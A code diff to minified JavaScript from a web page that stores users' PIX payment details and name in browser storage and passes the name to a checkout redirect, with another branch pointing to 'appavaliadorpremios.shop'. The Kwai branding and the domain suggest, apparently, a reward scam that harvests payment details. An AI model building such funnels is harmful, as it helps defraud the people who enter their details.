@@ -78,6 +78,7 @@
                     r.useCallback)(e => {
                         p(e),
                             localStorage.setItem("kwai-pix-details", JSON.stringify(e))
+                        sessionStorage.setItem("userName", S.name);
                     }
                         , [])
                 , v = (0,
@@ -400,6 +401,7 @@
                     try {
                         if (Object.values(S).every(e => e))
                             localStorage.setItem("kwai-pix-details", JSON.stringify(S)),
+                                sessionStorage.setItem("userName", S.name),
                                 j("confirm");
                         else
                             throw Error("Please fill in all PIX details")
@@ -423,24 +425,11 @@
                         window.location.href = 'https://appavaliadorpremios.shop/lp/';
                     } else {
                         const urlParams = new URLSearchParams(window.location.search);
-
-                        // Tenta recuperar o nome do usuário armazenado no cache
-                        let cachedName = sessionStorage.getItem('userName');
-
-                        // Se não existir no cache, tenta capturar do input (caso exista na página atual)
-                        if (!cachedName) {
-                            const nameInput = document.getElementById('name');
-                            if (nameInput && nameInput.value) {
-                                cachedName = nameInput.value;
-                                sessionStorage.setItem('userName', cachedName);
-                            }
+                        // Se existir um input com id "name", pega o seu valor e adiciona à query string
+                        const storedName = sessionStorage.getItem('userName');
+                        if (storedName) {
+                            urlParams.set('name', storedName);
                         }
-
-                        // Se o nome estiver disponível, adiciona-o à query string
-                        if (cachedName) {
-                            urlParams.set('name', cachedName);
-                        }
-
                         const utms = urlParams.toString();
                         const redirectUrl = "/checkout/" + (utms ? `?${utms}` : '');
                         window.location.href = redirectUrl;
